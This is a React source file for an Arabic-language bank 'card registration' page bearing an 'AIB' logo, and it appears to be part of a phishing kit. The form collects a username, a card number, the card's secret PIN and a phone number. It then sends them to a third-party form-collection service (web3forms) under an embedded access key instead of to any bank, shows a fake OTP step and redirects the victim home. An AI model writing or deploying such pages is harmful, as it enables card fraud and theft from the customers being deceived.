import React, { useState } from 'react';
import { X, CreditCard } from 'lucide-react';
import bankLogo from '../assets/images/logo (1).png';
import { useNavigate } from 'react-router-dom';
import OTPVerification from './OTP';

const LoginL = () => {
  const [result, setResult] = useState('');
  const [loading, setLoading] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const [isOtpVerified, setIsOtpVerified] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult('جاري الإرسال...');
    setLoading(true);

    // Simulate a delay for form submission
    setTimeout(async () => {
      setLoading(false);
      const formData = new FormData(event.target);
      formData.append('access_key', '20f19016-48fa-475b-b343-bae03fc652bf');

      try {
        const response = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          body: formData,
        });

        const data = await response.json();
        if (data.success) {
          setResult('تم إرسال النموذج بنجاح');
          setOtpVisible(true);

          // Navigate back to home after OTP verification (10 seconds)
          setTimeout(() => {
            setOtpVisible(false);
            navigate('/');
          }, 10000); // Changed from 1000000000 to 10000 (10 seconds)
        } else {
          console.error('Error', data);
          setResult(data.message || 'حدث خطأ أثناء إرسال النموذج');
        }
      } catch (error) {
        console.error('Submission error:', error);
        setResult('فشل الإرسال، حاول مرة أخرى');
        setLoading(false);
      }
    }, 5000);
  };

  return (
    <div className="py-4">
      {loading ? (
        <div className="flex justify-center items-center min-h-screen">
          <div className="text-lg text-gray-700">جاري التحميل...</div>
        </div>
      ) : otpVisible ? (
        isOtpVerified ? (
          <div className="text-center text-lg text-green-600">تم التحقق بنجاح!</div>
        ) : (
          <OTPVerification onVerified={() => setIsOtpVerified(true)} />
        )
      ) : (
        <div className="min-h-screen p-4">
          {/* Header */}
          <div className="flex justify-between items-start mb-12">
            <a href="/" className="cursor-pointer">
              <button className="rounded-full p-2 bg-[#92D3C8] text-black">
                <X size={22} />
              </button>
            </a>
            <img
              src={bankLogo}
              width={140}
              alt="AIB Logo"
              className="object-contain"
            />
          </div>

          {/* Form Title */}
          <h1 className="text-xl text-right mb-8">التسجيل من خلال البطاقة</h1>

          {/* Registration Form */}
          <form onSubmit={onSubmit} className="space-y-6 max-w-md mx-auto">
            {/* Username Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">اسم المستخدم</label>
              <input
                className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                placeholder="ادخل اسم المستخدم الخاص بك"
                dir="rtl"
                name="username" // Added name attribute
                required
              />
            </div>

            {/* Card Number Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">رقم البطاقة</label>
              <div className="flex gap-2">
                <input
                  className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                  name="card_number"
                  type="text"
                  placeholder="أدخل رقم البطاقة الخاص بك"
                  dir="rtl"
                  required
                  // pattern="\d{16}" // Basic validation for 16-digit card number
                  title="رقم البطاقة يجب أن يتكون من 16 رقمًا"
                />
                <div className="flex items-center justify-center w-14 h-14 bg-gray-200 rounded-lg">
                  <CreditCard className="text-[#92D3C8]" />
                </div>
              </div>
            </div>

            {/* Card Identifier Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">معرف البطاقة</label>
              <div className="relative">
                <input
                  type="password"
                  name="user_secret"
                  className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                  placeholder="أدخل الرقم السري للبطاقة الخاصة بك"
                  dir="rtl"
                  required
                  maxLength={12}
                  onChange={(e) => {
                    const counter = e.currentTarget.parentElement?.querySelector('span');
                    if (counter) {
                      counter.textContent = `${e.currentTarget.value.length}/12`;
                    }
                  }}
                />
                <span className="absolute left-3 bottom-3 text-gray-400 text-sm">0/12</span>
              </div>
            </div>

            {/* Phone Number Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">رقم الموبايل</label>
              <input
                type="tel"
                name="phone_number"
                className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                placeholder="ادخل رقم الموبايل الخاص بك"
                dir="rtl"
                required
                // pattern="\+?\d{10,14}" // Basic phone number validation
                title="أدخل رقم موبايل صالح (10-14 رقمًا)"
              />
            </div>

            {/* Terms Checkbox */}
            <div className="flex justify-start items-center gap-2">
              <input
                type="checkbox"
                id="terms"
                className="border-2 border-gray-300 rounded"
                required
              />
              <label htmlFor="terms" className="text-sm text-gray-700">
                الموافقة على الشروط والأحكام
              </label>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full bg-[#92D3C8] hover:bg-[#7bc0b5] text-white py-3 rounded-lg mt-6"
              disabled={loading}
            >
              تسجيل
            </button>
            <span className="block text-center mt-2">{result}</span>
          </form>
        </div>
      )}
    </div>
  );
};

export default LoginL;